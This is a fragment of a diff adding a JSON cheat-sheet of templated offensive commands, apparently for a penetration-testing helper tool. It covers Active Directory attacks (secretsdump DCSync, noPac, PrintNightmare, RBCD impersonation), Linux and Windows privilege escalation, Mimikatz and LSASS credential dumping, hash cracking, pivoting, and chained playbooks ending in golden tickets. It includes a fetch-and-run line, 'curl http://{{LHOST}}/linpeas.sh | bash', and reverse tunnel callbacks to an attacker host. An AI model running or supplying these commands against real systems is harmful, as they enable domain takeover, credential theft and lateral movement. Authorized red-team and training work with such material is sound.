+     "cmd": "impacket-secretsdump {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{IP}} -just-dc-user {{DOMAIN}}/administrator",
+     "tool": "impacket",
+     "when": "you have replication rights (DS-Replication-Get-Changes*)"
+    },
+    {
+     "lbl": "Dump the whole domain (NTDS)",
+     "cmd": "impacket-secretsdump {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{IP}} -just-dc",
+     "tool": "impacket",
+     "loud": true
+    },
+    {
+     "lbl": "noPac (CVE-2021-42278/42287)",
+     "cmd": "noPac.py {{DOMAIN}}/{{USER}}:'{{PASS}}' -dc-ip {{IP}} -dc-host {{DC}} --impersonate administrator -shell",
+     "surface": "ad",
+     "loud": true,
+     "when": "DC unpatched + MachineAccountQuota > 0"
+    },
+    {
+     "lbl": "PrintNightmare (CVE-2021-1675)",
+     "cmd": "python3 CVE-2021-1675.py {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{IP}} '\\\\{{LHOST}}\\share\\evil.dll'",
+     "surface": "ad",
+     "loud": true
+    }
+   ]
+  },
+  {
+   "id": "delegation",
+   "n": "13",
+   "name": "Delegation (RBCD / S4U)",
+   "surface": "ad",
+   "howto": "If you can write to a computer's msDS-AllowedToActOnBehalfOfOtherIdentity (or add a machine account), set up RBCD and impersonate any user to that host — including Administrator.",
+   "cmds": [
+    {
+     "lbl": "Add a computer account (MAQ default 10)",
+     "cmd": "impacket-addcomputer {{DOMAIN}}/{{USER}}:'{{PASS}}' -computer-name 'EVIL$' -computer-pass 'Passw0rd!' -dc-ip {{IP}}",
+     "tool": "impacket",
+     "when": "MachineAccountQuota > 0"
+    },
+    {
+     "lbl": "Write RBCD onto the target computer",
+     "cmd": "impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write {{DOMAIN}}/{{USER}}:'{{PASS}}' -dc-ip {{IP}}",
+     "tool": "impacket",
+     "when": "GenericWrite/GenericAll over the target computer"
+    },
+    {
+     "lbl": "S4U: impersonate Administrator to the host",
+     "cmd": "impacket-getST -spn cifs/{{DC}}.{{DOMAIN}} -impersonate administrator {{DOMAIN}}/'EVIL$':'Passw0rd!' -dc-ip {{IP}}",
+     "tool": "impacket"
+    },
+    {
+     "lbl": "Use the ticket",
+     "cmd": "export KRB5CCNAME=administrator.ccache; impacket-secretsdump -k -no-pass {{DOMAIN}}/administrator@{{DC}}.{{DOMAIN}}",
+     "tool": "impacket"
+    },
+    {
+     "lbl": "Find constrained-delegation accounts",
+     "cmd": "impacket-findDelegation {{DOMAIN}}/{{USER}}:'{{PASS}}' -dc-ip {{IP}}",
+     "tool": "impacket"
+    }
+   ]
+  },
+  {
+   "id": "linpe",
+   "n": "14",
+   "name": "Linux privesc",
+   "surface": "linux",
+   "howto": "Run linpeas, then check the fast wins by hand: sudo -l, SUID binaries, capabilities, writable cron, and anything in GTFOBins. One misconfigured binary is usually enough.",
+   "cmds": [
+    {
+     "lbl": "Run linpeas",
+     "cmd": "curl -s http://{{LHOST}}/linpeas.sh | bash",
+     "tool": "linpeas"
+    },
+    {
+     "lbl": "What can I run as root?",
+     "cmd": "sudo -l",
+     "surface": "linux"
+    },
+    {
+     "lbl": "SUID binaries (check GTFOBins)",
+     "cmd": "find / -perm -4000 -type f 2>/dev/null",
+     "surface": "linux"
+    },
+    {
+     "lbl": "File capabilities",
+     "cmd": "getcap -r / 2>/dev/null",
+     "surface": "linux"
+    },
+    {
+     "lbl": "Writable cron / systemd timers",
+     "cmd": "ls -la /etc/cron* /etc/systemd/system; cat /etc/crontab",
+     "surface": "linux"
+    },
+    {
+     "lbl": "World-writable files owned by root",
+     "cmd": "find / -writable -user root -type f 2>/dev/null | grep -v proc",
+     "surface": "linux"
+    },
+    {
+     "lbl": "Spawn root via sudo GTFO (example)",
+     "cmd": "sudo TARGET_BINARY # check gtfobins.github.io for the escape",
+     "surface": "linux"
+    },
+    {
+     "lbl": "Kernel exploit recon",
+     "cmd": "uname -a; cat /etc/os-release",
+     "surface": "linux"
+    }
+   ]
+  },
+  {
+   "id": "winpe",
+   "n": "15",
+   "name": "Windows privesc",
+   "surface": "windows",
+   "howto": "Check your privileges first: SeImpersonate/SeAssignPrimaryToken means a Potato -> SYSTEM. Then unquoted service paths, weak service perms, AlwaysInstallElevated, and saved creds.",
+   "cmds": [
+    {
+     "lbl": "Run winPEAS",
+     "cmd": "winpeas.exe",
+     "tool": "winpeas"
+    },
+    {
+     "lbl": "Check your privileges",
+     "cmd": "whoami /priv",
+     "surface": "windows"
+    },
+    {
+     "lbl": "SeImpersonate -> SYSTEM (GodPotato)",
+     "cmd": "GodPotato.exe -cmd 'cmd /c whoami'",
+     "surface": "windows",
+     "when": "SeImpersonate / SeAssignPrimaryToken held"
+    },
+    {
+     "lbl": "PrintSpoofer -> SYSTEM",
+     "cmd": "PrintSpoofer.exe -i -c cmd",
+     "surface": "windows",
+     "when": "SeImpersonate + spooler"
+    },
+    {
+     "lbl": "Unquoted service paths",
+     "cmd": "wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v '\"'",
+     "surface": "windows"
+    },
+    {
+     "lbl": "Weak service permissions",
+     "cmd": "accesschk.exe /accepteula -uwcqv '*' SERVICE",
+     "surface": "windows"
+    },
+    {
+     "lbl": "AlwaysInstallElevated check",
+     "cmd": "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer; reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer",
+     "surface": "windows"
+    },
+    {
+     "lbl": "Dump LSASS for creds",
+     "cmd": "nxc smb {{IP}} -u '{{USER}}' -p '{{PASS}}' -M lsassy",
+     "tool": "nxc",
+     "loud": true
+    },
+    {
+     "lbl": "Mimikatz: dump logon passwords",
+     "cmd": "mimikatz # sekurlsa::logonpasswords",
+     "tool": "mimikatz",
+     "surface": "windows",
+     "loud": true
+    }
+   ]
+  },
+  {
+   "id": "cracking",
+   "n": "16",
+   "name": "Hash cracking",
+   "surface": "linux",
+   "howto": "Match the mode to the hash: 1000 NTLM, 5600 NetNTLMv2, 13100 Kerberoast, 18200 AS-REP, 1800 sha512crypt. *2john converts app/file hashes for John.",
+   "cmds": [
+    {
+     "lbl": "NTLM",
+     "cmd": "hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt",
+     "tool": "hashcat"
+    },
+    {
+     "lbl": "NetNTLMv2 (Responder capture)",
+     "cmd": "hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt",
+     "tool": "hashcat"
+    },
+    {
+     "lbl": "Kerberoast TGS (RC4)",
+     "cmd": "hashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt",
+     "tool": "hashcat"
+    },
+    {
+     "lbl": "AS-REP",
+     "cmd": "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt",
+     "tool": "hashcat"
+    },
+    {
+     "lbl": "Linux sha512crypt (/etc/shadow)",
+     "cmd": "hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt",
+     "tool": "hashcat"
+    },
+    {
+     "lbl": "Apply a rule set for more coverage",
+     "cmd": "hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
+     "tool": "hashcat"
+    },
+    {
+     "lbl": "Convert a KeePass/zip/etc. hash for John",
+     "cmd": "keepass2john Database.kdbx > kp.hash   # also ssh2john, zip2john, office2john",
+     "tool": "john"
+    },
+    {
+     "lbl": "Crack with John + wordlist",
+     "cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt kp.hash",
+     "tool": "john"
+    }
+   ]
+  },
+  {
+   "id": "pivot",
+   "n": "17",
+   "name": "Pivoting & tunneling",
+   "surface": "network",
+   "howto": "Once you own a dual-homed host, tunnel through it to reach the internal subnet. ligolo-ng (TUN interface) is the cleanest; chisel + proxychains is the classic fallback.",
+   "cmds": [
+    {
+     "lbl": "ligolo-ng: start the proxy (your box)",
+     "cmd": "sudo ligolo-ng -selfcert",
+     "tool": "ligolo-ng"
+    },
+    {
+     "lbl": "ligolo-ng: run the agent (on target)",
+     "cmd": "agent -connect {{LHOST}}:11601 -ignore-cert",
+     "tool": "ligolo-ng"
+    },
+    {
+     "lbl": "ligolo-ng: add route to internal subnet",
+     "cmd": "sudo ip route add 10.10.10.0/24 dev ligolo",
+     "tool": "ligolo-ng"
+    },
+    {
+     "lbl": "chisel server (your box)",
+     "cmd": "chisel server -p 8000 --reverse",
+     "tool": "chisel"
+    },
+    {
+     "lbl": "chisel client reverse SOCKS (on target)",
+     "cmd": "chisel client {{LHOST}}:8000 R:socks",
+     "tool": "chisel"
+    },
+    {
+     "lbl": "proxychains through the SOCKS proxy",
+     "cmd": "proxychains -q nxc smb 10.10.10.0/24",
+     "tool": "proxychains"
+    },
+    {
+     "lbl": "SSH dynamic SOCKS proxy",
+     "cmd": "ssh -D 1080 -N {{USER}}@{{IP}}",
+     "surface": "network"
+    },
+    {
+     "lbl": "Local port forward over SSH",
+     "cmd": "ssh -L 8080:127.0.0.1:8080 {{USER}}@{{IP}}",
+     "surface": "network"
+    }
+   ]
+  },
+  {
+   "id": "playbooks",
+   "n": "18",
+   "name": "Attack playbooks",
+   "surface": "ad",
+   "howto": "Full chains — each starts from a condition you've already met. These are the routes BloodHound usually hands you; read the 'when' before firing.",
+   "cmds": [
+    {
+     "lbl": "Kerberoast -> crack -> reuse",
+     "cmd": "GetUserSPNs -request -> hashcat -m 13100 -> spray the cracked password with nxc",
+     "surface": "ad",
+     "when": "any valid domain creds + a service account with a weak password"
+    },
+    {
+     "lbl": "AS-REP roast -> crack",
+     "cmd": "GetNPUsers -no-pass -> hashcat -m 18200",
+     "surface": "ad",
+     "when": "an account has 'Do not require Kerberos preauth' set"
+    },
+    {
+     "lbl": "Shadow Credentials -> auth",
+     "cmd": "certipy shadow auto -> certipy auth -> NT hash of the target",
+     "surface": "ad",
+     "when": "GenericWrite/GenericAll over a user and a 2016+ DC"
+    },
+    {
+     "lbl": "RBCD takeover",
+     "cmd": "addcomputer -> rbcd write -> getST -impersonate administrator -> secretsdump",
+     "surface": "ad",
+     "when": "GenericWrite over a computer object (+ MAQ > 0)"
+    },
+    {
+     "lbl": "AD CS ESC1",
+     "cmd": "certipy find -vulnerable -> req -upn administrator -> auth -pfx -> DA",
+     "surface": "ad",
+     "when": "a template lets the enrollee supply the subject (ESC1)"
+    },
+    {
+     "lbl": "PetitPotam -> ESC8 relay",
+     "cmd": "PetitPotam -> ntlmrelayx to CA web enroll -> cert for DC$ -> DCSync",
+     "surface": "ad",
+     "when": "AD CS HTTP enrollment reachable (ESC8)"
+    },
+    {
+     "lbl": "noPac -> SYSTEM",
+     "cmd": "noPac scanner -> noPac -shell (impersonate administrator)",
+     "surface": "ad",
+     "when": "DC unpatched for CVE-2021-42278/42287 and MAQ > 0"
+    },
+    {
+     "lbl": "DCSync -> golden ticket",
+     "cmd": "secretsdump -just-dc-user krbtgt -> ticketer with the krbtgt hash -> persistent DA",
+     "surface": "ad",
+     "when": "you have DCSync rights (or dumped krbtgt)"
+    },
+    {
+     "lbl": "Pass-the-Hash lateral movement",
+     "cmd": "nxc smb SUBNET -u {{USER}} -H HASH --local-auth to find where the hash is admin -> wmiexec -hashes",
+     "surface": "windows",
+     "when": "you dumped a local admin / reused NT hash"
+    }
+   ]
+  }
+ ]
+}
